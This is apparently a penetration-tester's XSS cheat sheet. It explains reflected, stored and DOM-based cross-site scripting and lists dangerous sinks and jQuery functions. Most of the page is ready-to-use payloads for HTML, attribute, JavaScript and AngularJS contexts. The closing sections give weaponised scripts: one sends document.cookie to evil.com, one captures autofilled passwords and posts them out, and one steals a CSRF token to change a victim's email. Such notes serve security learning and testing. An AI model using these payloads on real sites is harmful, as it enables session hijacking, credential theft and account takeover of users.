---
title: XSS
category: Web
order: 21
---

Cross-site scripting (XSS) allows an attacker to compromise the interactions that users have with a vulnerable application.

There are three main types of XSS attacks. These are: 

* **Reflected XSS**: where the malicious script comes from the current HTTP request.
* **Stored XSS**: where the malicious script comes from the website database.
* **DOM-based XSS**: where the vulnerability exists in client-side code rather than server-side code.


# Reflected XSS

Reflected XSS is the simplest variety of cross-site scripting. It arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way. 

```
https://example.com/status?message=<script>alert(1)</script>
```

# Stored XSS

Stored cross-site scripting (also known as second-order or persistent XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way. 

```
POST /post/comment HTTP/1.1
Host: example.com
Content-Length: 100

postId=3&comment=<script>alert(1)</script>&name=Carlos+Montoya&email=carlos%40normal-user.net
```

# DOM-based XSS

DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as `eval()` or `innerHTML`. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts.

Pay attention to the following sinks:

```
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```

> **Note**: Use the browser debugger to see the values of the variables.

## DOM XSS in Jquery

If a JavaScript library such as jQuery is being used, look out for sinks that can alter DOM elements on the page. For instance, jQuery's `attr()` function can change the attributes of DOM elements. If data is read from a user-controlled source like the URL, then passed to the `attr()` function, then it may be possible to manipulate the value sent to cause XSS.

* Example of `attr()`

```js
$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```
We can use:

```
?returnUrl=javascript:alert(document.domain)
```

* Example of `hashchange`

```js
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
```

We can use:

```
<iframe src="https://example.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

Pay attention to the following jQuery functions:

```
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

## DOM XSS in AngularJS

If a framework like AngularJS is used, it may be possible to execute JavaScript without angle brackets or events. When a site uses the `ng-app` attribute on an HTML element, it will be processed by AngularJS. In this case, AngularJS will execute JavaScript inside double curly braces that can occur directly in HTML or inside attributes.

Example of payload:

```
{{$on.constructor('alert(1)')()}}
```

# XSS contexts

Visit the following link to see all posible tags and attributes.

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)


## XSS between HTML tags

Typicall payloads are:

```html
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```
* **HTML context with most tags and attributes blocked**:

We can use an iframe to load the XSS and trigger it with javascript, an example of this is to use `onresize` attribute with the XSS payload and use `onload` attribute to resize it.

```
<iframe src="https://example.com/?search=%3Cbody+onresize=print()%3E" onload=this.style.width='10px'>
```

* **HTML context with all tags blocked except custom ones**:

We can create any custom tag script with the following payload:

```html
<benjugat id=x onload=alert(document.cookie) tabindex=1>#x

<script>
document.location = "https://example.com/?search=%3Cbenjugat+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x"
</script>
```

## XSS in HTML attributes

* **Terminating the tag**:

Some times we can exit the tag and inject a new one.

```html
"><img src=1 onerror=alert(1)>
```

* **Injecting a new attribute**:

If we can inject on a html tag and we can not exit the tag because the angle brackets are encoded `< >`, try to use the **XSS Cheatsheet** in order to find a proper event to execute our XSS.

Example of input:

```html
<input type=text placeholder='Search the blog...' name=search value="TEST" autofocus onfocus="alert(1)">

Payload used: TEST" autofocus onfocus="alert(1)
```

* **Scriptable context**:

Some times we can inject on a tag that itself can create a scriptable context.

```html
<a href="javascript:alert(1)">
```

* **Canonical tags**:

You might encounter websites that encode angle brackets but still allow you to inject attributes.

Sometimes, these injections are possible even within tags that don't usually fire events automatically, such as a canonical tag. 

You can exploit this behavior using access keys and user interaction on Chrome. Access keys allow you to provide keyboard shortcuts that reference a specific element.

The `accesskey` attribute allows you to define a letter that, when pressed in combination with other keys (these vary across different platforms), will cause events to fire. 

This means we can execute an XSS payload inside a `hidden` attribute, provided you can persuade the victim into pressing the key combination. On Firefox Windows/Linux the key combination is `ALT+SHIFT+X` and on OS X it is `CTRL+ALT+X`.

You can specify a different key combination using a different key in the access key attribute. Here is the vector:

```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```

## XSS into JavaScript

When the XSS context is some existing JavaScript within the response, a wide variety of situations can arise, with different techniques necessary to perform a successful exploit. 

* **Terminating the existing script**:

In the simplest case, it is possible to simply close the script tag and introduce a new HTML tag with our payload.

```html
</script><img src=1 onerror=alert(1)
```

* **Breaking out of a Javascript string**:

In cases where the XSS context is inside a quoted string literal, it is often possible to break out of the string and execute JavaScript directly. It is essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing. 

```
'-alert(1)-'
';alert(1)//
\';alert(1)//
onerror=alert;throw 1
```

* **HTML encoding**:

When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters. 

```
&apos;-alert(1)-&apos;
```

* **XSS in JavaScript template literals**:

JavaScript template literals are string literals that allow embedded JavaScript expressions. The embedded expressions are evaluated and are normally concatenated into the surrounding text. Template literals are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the `${...}`

```
${alert(document.domain)}
```

# XSS to steal cookies

Stealing cookies is a traditional way to exploit XSS. Most web applications use cookies for session handling. You can exploit cross-site scripting vulnerabilities to send the victim's cookies to your own domain, then manually inject the cookies into the browser and impersonate the victim.

```html
<script>document.location='https://evil.com/?'+document.cookie</script>
```

```html
<script>
fetch('https://evil.com', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

# XSS to capture passwords

These days, many users have password managers that auto-fill their passwords. You can take advantage of this by creating a password input, reading out the auto-filled password, and sending it to your own domain. This technique avoids most of the problems associated with stealing cookies, and can even gain access to every other account where the victim has reused the same password. 

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://evil.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

# XSS to bypass CSRF protections

Some websites allow logged-in users to change their email address without re-entering their password. If you've found an XSS vulnerability on one of these sites, you can exploit it to steal a CSRF token. With the token, you can change the victim's email address to one that you control. 

```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test2@test.com')
};
</script>
```